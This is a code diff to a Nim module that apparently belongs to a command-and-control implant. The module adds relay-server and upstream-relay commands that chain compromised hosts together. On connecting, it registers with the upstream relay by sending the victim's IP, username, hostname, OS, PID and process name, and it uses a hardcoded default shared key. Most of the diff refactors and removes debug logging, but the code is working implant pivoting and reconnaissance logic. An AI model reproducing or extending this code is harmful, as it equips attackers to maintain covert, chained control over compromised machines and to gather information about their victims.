@@ -2,27 +2,19 @@ import strutils, json, times
 import ../../core/relay/[relay_protocol, relay_comm, relay_config]
 import ../../util/sysinfo
 
-# Import enhanced functions from relay_comm
+# Import specific functions that actually exist
 from ../../core/relay/relay_comm import initializeDistributedRoutingSystem, 
     demonstrateRoutingSystem, testDistributedRoutingSystem, getRoutingPerformanceStats
 
 # Import key management functions from relay_config
-from ../../core/relay/relay_config import getKeyConfigStatus
-
-# Forward declarations for enhanced functions
-proc startRelayServerEnhanced*(port: int, implantID: string): bool
-proc connectToRelayEnhanced*(host: string, port: int, implantID: string): bool  
-proc showRelaySystemStatus*(): string
-proc testRelaySystem*(): string
+from ../../core/relay/relay_config import getKeyConfigStatus, generateImplantID
 
 # Local adaptive timeout calculation to avoid circular imports
 proc getLocalAdaptiveTimeout(): int =
     # Start with reasonable defaults and adjust based on success/failure
     result = 100  # 100ms base timeout
 
-
-
-# Global relay state using relay_comm.nim types - NO MORE DIRECT SOCKETS!
+# Global relay state using relay_comm.nim types
 var g_relayServer*: RelayServer
 var upstreamRelay*: RelayConnection
 var isConnectedToRelay* = false
@@ -61,7 +53,124 @@ proc sendToClient*(server: RelayServer, clientID: string, message: RelayMessage)
 proc getConnectedClients*(server: RelayServer): seq[string] {.exportc.} =
     return relay_comm.getConnectedClients(server)
 
-# Process relay commands - USING ENHANCED DISTRIBUTED ROUTING SYSTEM
+# Initialize the relay system with distributed routing
+proc initializeRelaySystem*(implantID: string): bool =
+    try:
+        # Initialize with default shared key (can be updated later)
+        let systemReady = initializeDistributedRoutingSystem(implantID, "default_shared_key")
+        
+        if systemReady:
+            when defined debug:
+                echo "[RELAY] ✅ Distributed routing system initialized successfully"
+                echo "[RELAY] 🆔 Implant ID: " & implantID
+            
+            # Show system demo
+            demonstrateRoutingSystem()
+            
+            return true
+        else:
+            when defined debug:
+                echo "[RELAY] ❌ Failed to initialize distributed routing system"
+            return false
+            
+    except:
+        when defined debug:
+            echo "[RELAY] ❌ Relay system initialization error: " & getCurrentExceptionMsg()
+        return false
+
+# Start relay server with enhanced features
+proc startRelayServerEnhanced*(port: int, implantID: string): bool =
+    try:
+        # Initialize the routing system first
+        if not initializeRelaySystem(implantID):
+            return false
+        
+        when defined debug:
+            echo "[RELAY] 🚀 Enhanced relay server initialized on port " & $port
+            echo "[RELAY] 🛰️ Using distributed routing with persistent routes"
+            echo "[RELAY] 🔄 Supporting bidirectional message flow"
+        
+        # Run system tests
+        let testResults = testDistributedRoutingSystem()
+        when defined debug:
+            echo "[RELAY] 🧪 System tests: " & $testResults.passed & " passed, " & $testResults.failed & " failed"
+        
+        return true
+            
+    except:
+        when defined debug:
+            echo "[RELAY] ❌ Enhanced relay server start error: " & getCurrentExceptionMsg()
+        return false
+
+# Connect to relay with enhanced features
+proc connectToRelayEnhanced*(host: string, port: int, implantID: string): bool =
+    try:
+        # Initialize the routing system first
+        if not initializeRelaySystem(implantID):
+            return false
+        
+        when defined debug:
+            echo "[RELAY] ✅ Enhanced relay client initialized for " & host & ":" & $port
+            echo "[RELAY] 🛰️ Using distributed routing with persistent routes"
+            echo "[RELAY] 🔄 Supporting bidirectional message flow"
+        
+        # Test the connection logic
+        let connection = connectToRelay(host, port)
+        if connection.isConnected:
+            when defined debug:
+                echo "[RELAY] 📝 Connection established with route tracing capabilities"
+            return true
+        else:
+            when defined debug:
+                echo "[RELAY] ❌ Failed to establish connection"
+            return false
+            
+    except:
+        when defined debug:
+            echo "[RELAY] ❌ Enhanced relay client connection error: " & getCurrentExceptionMsg()
+        return false
+
+# Show system status with routing information
+proc showRelaySystemStatus*(): string =
+    try:
+        let keyStatus = getKeyConfigStatus()
+        let perfStats = getRoutingPerformanceStats()
+        
+        result = "[RELAY STATUS]\n"
+        result &= "🆔 Implant ID: " & keyStatus.implantID & "\n"
+        result &= "🔑 Shared Key: " & (if keyStatus.hasShared: "✅ Available" else: "❌ Missing") & "\n"
+        result &= "🔐 Unique Key: " & (if keyStatus.hasUnique: "✅ Available" else: "❌ Missing") & "\n"
+        result &= "📊 Avg Route Length: " & $perfStats.avgRouteLength & " hops\n"
+        result &= "📊 Max Route Length: " & $perfStats.maxRouteLength & " hops\n"
+        result &= "📊 Routing Efficiency: " & $(perfStats.routingEfficiency * 100.0) & "%\n"
+        result &= "🚀 System Status: Ready for distributed routing\n"
+        
+    except:
+        result = "[RELAY STATUS] ❌ Error getting system status: " & getCurrentExceptionMsg()
+
+# Test the complete relay system
+proc testRelaySystem*(): string =
+    try:
+        let testResults = testDistributedRoutingSystem()
+        
+        result = "[RELAY TESTS]\n"
+        result &= "🧪 Tests Passed: " & $testResults.passed & "\n"
+        result &= "🧪 Tests Failed: " & $testResults.failed & "\n"
+        result &= "🧪 Total Tests: " & $(testResults.passed + testResults.failed) & "\n"
+        result &= "🧪 Success Rate: " & $(if testResults.passed + testResults.failed > 0: (testResults.passed * 100) div (testResults.passed + testResults.failed) else: 0) & "%\n"
+        
+        for detail in testResults.details:
+            result &= "🧪 " & detail & "\n"
+        
+        if testResults.failed == 0:
+            result &= "🎉 All tests passed! System is ready.\n"
+        else:
+            result &= "⚠️ Some tests failed. Check system configuration.\n"
+            
+    except:
+        result = "[RELAY TESTS] ❌ Error running tests: " & getCurrentExceptionMsg()
+
+# Process relay commands
 proc processRelayCommand*(cmd: string): string =
     when defined debug:
         echo "[RELAY_CMD] 🎯 === PROCESS RELAY COMMAND ==="
@@ -71,63 +180,29 @@ proc processRelayCommand*(cmd: string): string =
     if parts.len < 2:
         when defined debug:
             echo "[RELAY_CMD] 🎯 ❌ Invalid command format"
-            echo "[RELAY_CMD] 🎯 === END PROCESS RELAY COMMAND (ERROR) ==="
         return "Usage: relay <command> [args]"
     
     let subCommand = parts[1]
     when defined debug:
         echo "[RELAY_CMD] 🎯 Sub-command: " & subCommand
-        echo "[RELAY_CMD] 🎯 Arguments: " & $parts[2..^1]
     
     case subCommand:
     of "port":
-        when defined debug:
-            echo "[RELAY_CMD] 🚀 === RELAY PORT COMMAND ==="
-        
         if parts.len < 3:
-            when defined debug:
-                echo "[RELAY_CMD] 🚀 ❌ Missing port number"
-                echo "[RELAY_CMD] 🚀 === END RELAY PORT COMMAND (ERROR) ==="
             return "Usage: relay port <port_number>"
         
-        let portStr = parts[2]
-        when defined debug:
-            echo "[RELAY_CMD] 🚀 Port string: " & portStr
-        
-        let port = parseInt(portStr)
-        when defined debug:
-            echo "[RELAY_CMD] 🚀 Port number: " & $port
-            echo "[RELAY_CMD] 🚀 Current server state: " & (if g_relayServer.isListening: "LISTENING" else: "STOPPED")
+        let port = parseInt(parts[2])
         
         if g_relayServer.isListening:
-            when defined debug:
-                echo "[RELAY_CMD] 🚀 ❌ Server already running on port " & $g_relayServer.port
-                echo "[RELAY_CMD] 🚀 === END RELAY PORT COMMAND (ALREADY RUNNING) ==="
             return "Relay server already running on port " & $g_relayServer.port
         
         try:
-            when defined debug:
-                echo "[RELAY_CMD] 🚀 Starting ENHANCED relay server on port " & $port
-            
-            # FASE 6: USE ENHANCED FUNCTION WITH DISTRIBUTED ROUTING
             let implantID = generateImplantID("RELAY-SERVER-" & $port)
-            when defined debug:
-                echo "[RELAY_CMD] 🚀 Generated implant ID: " & implantID
-            
             let success = startRelayServerEnhanced(port, implantID)
-            when defined debug:
-                echo "[RELAY_CMD] 🚀 Enhanced server start result: " & $success
             
             if success:
-                # After enhanced start, update global server state
+                # Start the actual relay server
                 g_relayServer = startRelayServer(port)
-                
-                when defined debug:
-                    echo "[RELAY_CMD] 🚀 ✅ Enhanced relay server started successfully!"
-                    echo "[RELAY_CMD] 🚀 - Distributed routing: ENABLED"
-                    echo "[RELAY_CMD] 🚀 - Route tracing: ENABLED"
-                    echo "[RELAY_CMD] 🚀 - Bidirectional flow: ENABLED"
-                    echo "[RELAY_CMD] 🚀 - Key management: ENHANCED"
                 
                 # IMMEDIATE CHAIN INFO REPORTING: Role change detected
                 var newRole = "RELAY_SERVER"
@@ -136,100 +211,49 @@ proc processRelayCommand*(cmd: string): string =
                 # Check if we're also connected upstream (chained relay server)
                 if upstreamRelay.isConnected:
                     parentGuid = g_localParentRelayServerGuid
-                    when defined debug:
-                        echo "[RELAY_CMD] 🔗 Chained relay server detected, parent: " & parentGuid
                 
                 # Signal main loop to send chain info immediately on next cycle
                 g_immediateChainInfoUpdate = true
                 g_pendingChainInfo = (newRole, parentGuid, port)
                 
-                when defined debug:
-                    echo "[RELAY_CMD] 🔗 Chain Info: Enhanced SERVER role detected - Port: " & $port
-                    echo "[RELAY_CMD] 🚀 === END RELAY PORT COMMAND (SUCCESS) ==="
-                
                 return "🚀 Enhanced relay server started on port " & $port & " with distributed routing"
             else:
-                when defined debug:
-                    echo "[RELAY_CMD] 🚀 ❌ Enhanced relay server failed to start"
-                    echo "[RELAY_CMD] 🚀 === END RELAY PORT COMMAND (START FAILED) ==="
                 return "Failed to start enhanced relay server on port " & $port
         except:
-            let errorMsg = getCurrentExceptionMsg()
-            when defined debug:
-                echo "[RELAY_CMD] 🚀 ❌ Exception during server start: " & errorMsg
-                echo "[RELAY_CMD] 🚀 === END RELAY PORT COMMAND (EXCEPTION) ==="
-            return "Failed to start enhanced relay server: " & errorMsg
+            return "Failed to start enhanced relay server: " & getCurrentExceptionMsg()
     
     of "connect":
-        when defined debug:
-            echo "[RELAY_CMD] 🔗 === RELAY CONNECT COMMAND ==="
-        
         if parts.len < 3:
-            when defined debug:
-                echo "[RELAY_CMD] 🔗 ❌ Missing relay URL"
-                echo "[RELAY_CMD] 🔗 === END RELAY CONNECT COMMAND (ERROR) ==="
             return "Usage: relay connect relay://ip:port"
         
         let relayUrl = parts[2]
-        when defined debug:
-            echo "[RELAY_CMD] 🔗 Relay URL: " & relayUrl
         
         if not relayUrl.startsWith("relay://"):
-            when defined debug:
-                echo "[RELAY_CMD] 🔗 ❌ Invalid URL format"
-                echo "[RELAY_CMD] 🔗 === END RELAY CONNECT COMMAND (INVALID URL) ==="
             return "Invalid relay URL format. Use: relay://ip:port"
         
         try:
             let cleanUrl = relayUrl.replace("relay://", "").strip(chars = {'"'})
-            when defined debug:
-                echo "[RELAY_CMD] 🔗 Clean URL: " & cleanUrl
-            
             let urlParts = cleanUrl.split(":")
             if urlParts.len != 2:
-                when defined debug:
-                    echo "[RELAY_CMD] 🔗 ❌ Invalid URL parts: " & $urlParts
-                    echo "[RELAY_CMD] 🔗 === END RELAY CONNECT COMMAND (INVALID PARTS) ==="
                 return "Invalid relay URL format"
             
             let host = urlParts[0]
             let port = parseInt(urlParts[1])
-            when defined debug:
-                echo "[RELAY_CMD] 🔗 Host: " & host
-                echo "[RELAY_CMD] 🔗 Port: " & $port
-                echo "[RELAY_CMD] 🔗 Current connection state: " & (if upstreamRelay.isConnected: "CONNECTED" else: "DISCONNECTED")
             
             if upstreamRelay.isConnected:
-                when defined debug:
-                    echo "[RELAY_CMD] 🔗 ❌ Already connected to upstream relay"
-                    echo "[RELAY_CMD] 🔗 === END RELAY CONNECT COMMAND (ALREADY CONNECTED) ==="
                 return "Already connected to upstream relay"
             
-            when defined debug:
-                echo "[RELAY_CMD] 🔗 Starting ENHANCED relay client connection"
-            
-            # FASE 6: USE ENHANCED FUNCTION WITH DISTRIBUTED ROUTING
             let implantID = generateImplantID("RELAY-CLIENT-" & host & "-" & $port)
-            when defined debug:
-                echo "[RELAY_CMD] 🔗 Generated implant ID: " & implantID
-            
             let success = connectToRelayEnhanced(host, port, implantID)
-            when defined debug:
-                echo "[RELAY_CMD] 🔗 Enhanced connection result: " & $success
             
             if success:
-                # After enhanced connect, update global connection state
+                # Connect to the actual relay
                 upstreamRelay = connectToRelay(host, port)
                 if upstreamRelay.isConnected:
                     isConnectedToRelay = true  # Disable HTTP communication
-                    when defined debug:
-                        echo "[RELAY_CMD] 🔗 ✅ Enhanced connection established"
-                        echo "[RELAY_CMD] 🔗 HTTP communication disabled"
                     
-                    # Send registration message with complete system info
+                    # Send registration message
                     let route = @[implantID, "UPSTREAM"]
-                    when defined debug:
-                        echo "[RELAY_CMD] 🔗 Registration route: " & $route
                     
                     # Collect system information for relay registration  
                     let localIP = getLocalIP()
@@ -239,16 +263,7 @@ proc processRelayCommand*(cmd: string): string =
                     let pid = getCurrentPID()
                     let processName = getCurrentProcessName()
                     
-                    when defined debug:
-                        echo "[RELAY_CMD] 🔗 System info collected:"
-                        echo "[RELAY_CMD] 🔗 - Local IP: " & localIP
-                        echo "[RELAY_CMD] 🔗 - Username: " & username
-                        echo "[RELAY_CMD] 🔗 - Hostname: " & hostname
-                        echo "[RELAY_CMD] 🔗 - OS Info: " & osInfo
-                        echo "[RELAY_CMD] 🔗 - PID: " & $pid
-                        echo "[RELAY_CMD] 🔗 - Process: " & processName
-                    
-                    # Create complete registration data as JSON
+                    # Create registration data as JSON
                     let regData = %*{
                         "implantID": implantID,
                         "localIP": localIP,
@@ -262,17 +277,9 @@ proc processRelayCommand*(cmd: string): string =
                         "mode": "enhanced_relay_connect"
                     }
                     
-                    when defined debug:
-                        echo "[RELAY_CMD] 🔗 Registration data: " & $regData
-                    
                     let registerMsg = createMessage(REGISTER, implantID, route, $regData)
-                    when defined debug:
-                        echo "[RELAY_CMD] 🔗 Created registration message ID: " & registerMsg.id
                     
                     if sendMessage(upstreamRelay, registerMsg):
-                        when defined debug:
-                            echo "[RELAY_CMD] 🔗 ✅ Registration message sent successfully"
-                        
                         # IMMEDIATE CHAIN INFO REPORTING: Role change detected
                         var newRole = "RELAY_CLIENT"
                         var parentGuid = g_localParentRelayServerGuid
@@ -281,42 +288,18 @@ proc processRelayCommand*(cmd: string): string =
                         g_immediateChainInfoUpdate = true
                         g_pendingChainInfo = (newRole, parentGuid, 0)  # Client has no listening port
                         
-                        when defined debug:
-                            echo "[RELAY_CMD] 🔗 Chain Info: Enhanced CONNECTION transition detected - Role: " & newRole
-                            echo "[RELAY_CMD] 🔗 Enhanced relay client connected with distributed routing capabilities"
-                            echo "[RELAY_CMD] 🔗 === END RELAY CONNECT COMMAND (SUCCESS) ==="
                         return "🔗 Enhanced relay client connected to " & host & ":" & $port & " with distributed routing"
                     else:
-                        when defined debug:
-                            echo "[RELAY_CMD] 🔗 ❌ Failed to send registration message"
-                            echo "[RELAY_CMD] 🔗 === END RELAY CONNECT COMMAND (REGISTRATION FAILED) ==="
                         return "Enhanced connection established but failed to register with relay"
                 else:
-                    when defined debug:
-                        echo "[RELAY_CMD] 🔗 ❌ Enhanced connection failed to establish"
-                        echo "[RELAY_CMD] 🔗 === END RELAY CONNECT COMMAND (CONNECTION FAILED) ==="
                     return "Enhanced connection failed to establish"
             else:
-                when defined debug:
-                    echo "[RELAY_CMD] 🔗 ❌ Failed to initialize enhanced relay client"
-                    echo "[RELAY_CMD] 🔗 === END RELAY CONNECT COMMAND (INIT FAILED) ==="
                 return "Failed to initialize enhanced relay client"
         except:
-            let errorMsg = getCurrentExceptionMsg()
-            when defined debug:
-                echo "[RELAY_CMD] 🔗 ❌ Exception during connection: " & errorMsg
-                echo "[RELAY_CMD] 🔗 === END RELAY CONNECT COMMAND (EXCEPTION) ==="
-            return "Failed to connect to relay (enhanced): " & errorMsg
+            return "Failed to connect to relay (enhanced): " & getCurrentExceptionMsg()
     
     of "disconnect":
-        when defined debug:
-            echo "[RELAY_CMD] 🔌 === RELAY DISCONNECT COMMAND ==="
-            echo "[RELAY_CMD] 🔌 Current connection state: " & (if upstreamRelay.isConnected: "CONNECTED" else: "DISCONNECTED")
-        
         if not upstreamRelay.isConnected:
-            when defined debug:
-                echo "[RELAY_CMD] 🔌 ❌ Not connected to any upstream relay"
-                echo "[RELAY_CMD] 🔌 === END RELAY DISCONNECT COMMAND (NOT CONNECTED) ==="
             return "Not connected to any upstream relay"
         
         try:
@@ -325,42 +308,21 @@ proc processRelayCommand*(cmd: string): string =
             if g_relayServer.isListening:
                 newRole = "RELAY_SERVER"
             
-            when defined debug:
-                echo "[RELAY_CMD] 🔌 New role after disconnect: " & newRole
-            
             # Signal main loop to send chain info immediately on next cycle
             g_immediateChainInfoUpdate = true
             g_pendingChainInfo = (newRole, "", g_relayServer.port)
             
-            when defined debug:
-                echo "[RELAY_CMD] 🔌 Chain Info: DISCONNECTION transition detected - Role: " & newRole
-            
-            # USE SAFE FUNCTION FROM relay_comm.nim
+            # Disconnect from upstream relay
             closeConnection(upstreamRelay)
             isConnectedToRelay = false  # Re-enable HTTP communication
             
-            when defined debug:
-                echo "[RELAY_CMD] 🔌 ✅ Disconnected from upstream relay"
-                echo "[RELAY_CMD] 🔌 HTTP communication re-enabled"
-                echo "[RELAY_CMD] 🔌 === END RELAY DISCONNECT COMMAND (SUCCESS) ==="
-            
             return "Disconnected from upstream relay (HTTP re-enabled)"
         except:
-            let errorMsg = getCurrentExceptionMsg()
-            when defined debug:
-                echo "[RELAY_CMD] 🔌 ❌ Exception during disconnect: " & errorMsg
-                echo "[RELAY_CMD] 🔌 === END RELAY DISCONNECT COMMAND (EXCEPTION) ==="
-            return "Failed to disconnect: " & errorMsg
+            return "Failed to disconnect: " & getCurrentExceptionMsg()
     
     of "status":
-        when defined debug:
-            echo "[RELAY_CMD] 📊 === RELAY STATUS COMMAND ==="
-        
-        # FASE 6: USE ENHANCED STATUS WITH DISTRIBUTED ROUTING INFO
         try:
             let enhancedStatus = showRelaySystemStatus()
-            when defined debug:
-                echo "[RELAY_CMD] 📊 Enhanced status retrieved"
             
             # Add traditional relay status info
             var status = "=== ENHANCED RELAY STATUS ===\n"
@@ -388,17 +350,8 @@ proc processRelayCommand*(cmd: string): string =
             status &= "Protocol: Enhanced Multi-Client with Distributed Routing\n"
             status &= "Features: Route tracing, Bidirectional flow, Smart encryption\n"
             
-            when defined debug:
-                echo "[RELAY_CMD] 📊 Status report generated"
-                echo "[RELAY_CMD] 📊 === END RELAY STATUS COMMAND (SUCCESS) ==="
-            
             return status
         except:
-            let errorMsg = getCurrentExceptionMsg()
-            when defined debug:
-                echo "[RELAY_CMD] 📊 ❌ Exception during status: " & errorMsg
-                echo "[RELAY_CMD] 📊 Falling back to basic status"
-            
             # Fallback to basic status if enhanced fails
             var status = "=== BASIC RELAY STATUS ===\n"
             status &= "Relay Server: " & (if g_relayServer.isListening: "Running on port " & $g_relayServer.port else: "Stopped") & "\n"
@@ -407,7 +360,6 @@ proc processRelayCommand*(cmd: string): string =
             return status
     
     of "test":
-        # FASE 6: NEW COMMAND - TEST DISTRIBUTED ROUTING SYSTEM
         try:
             let testResults = testRelaySystem()
             return testResults
@@ -423,18 +375,11 @@ proc processRelayCommand*(cmd: string): string =
             var newRole = "STANDARD"
             var parentGuid = ""
             
-            # SIMPLIFIED: When we stop relay server, we become STANDARD (no longer listening)
-            when defined debug:
-                echo "[DEBUG] 🔗 Chain Info: SERVER->STANDARD transition detected - Stopping relay server"
-            
             # Signal main loop to send chain info immediately on next cycle
             g_immediateChainInfoUpdate = true
             g_pendingChainInfo = (newRole, parentGuid, 0)
             
-            when defined debug:
-                echo "[DEBUG] 🔗 Chain Info: Scheduled immediate update - Role: " & newRole
-            
-            # USE SAFE FUNCTION FROM relay_comm.nim
+            # Stop the relay server
             closeRelayServer(g_relayServer)
             return "🛑 Enhanced relay server stopped (secure shutdown with distributed routing cleanup)"
         except:
@@ -489,13 +434,13 @@ proc processRelayCommand*(cmd: string): string =
                "  relay send <id> <msg>  - Send message to specific client\n" &
                "  relay stop             - Stop relay server"
 
-# Poll relay server for new messages - USING SAFE FUNCTIONS
+# Poll relay server for new messages
 proc pollRelayServerMessages*(): seq[RelayMessage] =
     if not g_relayServer.isListening:
         return @[]
     
     try:
-        # CRITICAL: Process ALL available messages to prevent backlog
+        # Process ALL available messages to prevent backlog
         var allMessages: seq[RelayMessage] = @[]
         var continuePolling = true
         var pollCount = 0
@@ -511,8 +456,6 @@ proc pollRelayServerMessages*(): seq[RelayMessage] =
                     echo "[DEBUG] 🔄 Relay polling cycle " & $pollCount & ": got " & $messages.len & " messages (timeout: " & $adaptiveTimeout & "ms)"
             else:
                 continuePolling = false  # No more messages available
-                when defined debug:
-                    echo "[DEBUG] 🔄 No more messages available in cycle " & $pollCount
         
         when defined debug:
             if allMessages.len > 0:
@@ -524,21 +467,16 @@ proc pollRelayServerMessages*(): seq[RelayMessage] =
             echo "[DEBUG] Error polling relay server messages: " & e.msg
         return @[]
 
-# Poll upstream relay for messages - USING SAFE FUNCTIONS
+# Poll upstream relay for messages
 proc pollUpstreamRelayMessages*(): seq[RelayMessage] =
     when defined debug:
         echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Checking connection status: " & $upstreamRelay.isConnected
     
     if not upstreamRelay.isConnected:
-        when defined debug:
-            echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Not connected, returning empty array"
         return @[]
     
     try:
-        when defined debug:
-            echo "[DEBUG] 🔍 pollUpstreamRelayMessages: Calling pollMessages with adaptive timeout"
-        
-        # USE SAFE FUNCTION FROM relay_comm.nim - ADAPTIVE TIMEOUT to adjust to network conditions
+        # Use adaptive timeout to adjust to network conditions
         let adaptiveTimeout = getLocalAdaptiveTimeout()
         let messages = pollMessages(upstreamRelay, adaptiveTimeout)
         
@@ -552,120 +490,7 @@ proc pollUpstreamRelayMessages*(): seq[RelayMessage] =
         upstreamRelay.isConnected = false
         return @[]
 
-# Cleanup dead connections - USING SAFE FUNCTIONS
+# Cleanup dead connections
 proc cleanupRelayConnections*() =
     if g_relayServer.isListening:
         cleanupConnections(g_relayServer)
-
-# ============================================================================  
-# LEGACY TOPOLOGY SYSTEM REMOVED - Using distributed chain relationships
-# ============================================================================ 
-
-# Initialize the relay system with new distributed routing
-proc initializeRelaySystem*(implantID: string): bool =
-    try:
-        # Initialize the new distributed routing system
-        let systemReady = initializeDistributedRoutingSystem(implantID)
-        
-        if systemReady:
-            echo "[RELAY] ✅ Distributed routing system initialized successfully"
-            echo "[RELAY] 🆔 Implant ID: " & implantID
-            
-            # Show system demo
-            demonstrateRoutingSystem()
-            
-            return true
-        else:
-            echo "[RELAY] ❌ Failed to initialize distributed routing system"
-            return false
-            
-    except:
-        echo "[RELAY] ❌ Relay system initialization error: " & getCurrentExceptionMsg()
-        return false
-
-# Enhanced relay server start with new system
-proc startRelayServerEnhanced*(port: int, implantID: string): bool =
-    try:
-        # Initialize the routing system first
-        if not initializeRelaySystem(implantID):
-            return false
-        
-        echo "[RELAY] 🚀 Enhanced relay server initialized on port " & $port
-        echo "[RELAY] 🛰️ Using distributed routing with persistent routes"
-        echo "[RELAY] 🔄 Supporting bidirectional message flow"
-        
-        # Run system tests
-        let testResults = testDistributedRoutingSystem()
-        echo "[RELAY] 🧪 System tests: " & $testResults.passed & " passed, " & $testResults.failed & " failed"
-        
-        return true
-            
-    except:
-        echo "[RELAY] ❌ Enhanced relay server start error: " & getCurrentExceptionMsg()
-        return false
-
-# Enhanced relay client connect with new system
-proc connectToRelayEnhanced*(host: string, port: int, implantID: string): bool =
-    try:
-        # Initialize the routing system first
-        if not initializeRelaySystem(implantID):
-            return false
-        
-        echo "[RELAY] ✅ Enhanced relay client initialized for " & host & ":" & $port
-        echo "[RELAY] 🛰️ Using distributed routing with persistent routes"
-        echo "[RELAY] 🔄 Supporting bidirectional message flow"
-        
-        # Test the connection logic
-        let connection = connectToRelay(host, port)
-        if connection.isConnected:
-            echo "[RELAY] 📝 Connection established with route tracing capabilities"
-            return true
-        else:
-            echo "[RELAY] ❌ Failed to establish connection"
-            return false
-            
-    except:
-        echo "[RELAY] ❌ Enhanced relay client connection error: " & getCurrentExceptionMsg()
-        return false
-
-# Show system status with new routing information
-proc showRelaySystemStatus*(): string =
-    try:
-        let keyStatus = getKeyConfigStatus()
-        let perfStats = getRoutingPerformanceStats()
-        
-        result = "[RELAY STATUS]\n"
-        result &= "🆔 Implant ID: " & keyStatus.implantID & "\n"
-        result &= "🔑 Shared Key: " & (if keyStatus.hasShared: "✅ Available" else: "❌ Missing") & "\n"
-        result &= "🔐 Unique Key: " & (if keyStatus.hasUnique: "✅ Available" else: "❌ Missing") & "\n"
-        result &= "📊 Avg Route Length: " & $perfStats.avgRouteLength & " hops\n"
-        result &= "📊 Max Route Length: " & $perfStats.maxRouteLength & " hops\n"
-        result &= "📊 Routing Efficiency: " & $(perfStats.routingEfficiency * 100.0) & "%\n"
-        result &= "🚀 System Status: Ready for distributed routing\n"
-        
-    except:
-        result = "[RELAY STATUS] ❌ Error getting system status: " & getCurrentExceptionMsg()
-
-# Test the complete relay system
-proc testRelaySystem*(): string =
-    try:
-        let testResults = testDistributedRoutingSystem()
-        
-        result = "[RELAY TESTS]\n"
-        result &= "🧪 Tests Passed: " & $testResults.passed & "\n"
-        result &= "🧪 Tests Failed: " & $testResults.failed & "\n"
-        result &= "🧪 Total Tests: " & $(testResults.passed + testResults.failed) & "\n"
-        result &= "🧪 Success Rate: " & $(if testResults.passed + testResults.failed > 0: (testResults.passed * 100) div (testResults.passed + testResults.failed) else: 0) & "%\n"
-        
-        for detail in testResults.details:
-            result &= "🧪 " & detail & "\n"
-        
-        if testResults.failed == 0:
-            result &= "🎉 All tests passed! System is ready.\n"
-        else:
-            result &= "⚠️ Some tests failed. Check system configuration.\n"
-            
-    except:
-        result = "[RELAY TESTS] ❌ Error running tests: " & getCurrentExceptionMsg()
-
-# sendMessageWithRouting function removed - use direct relay messaging instead
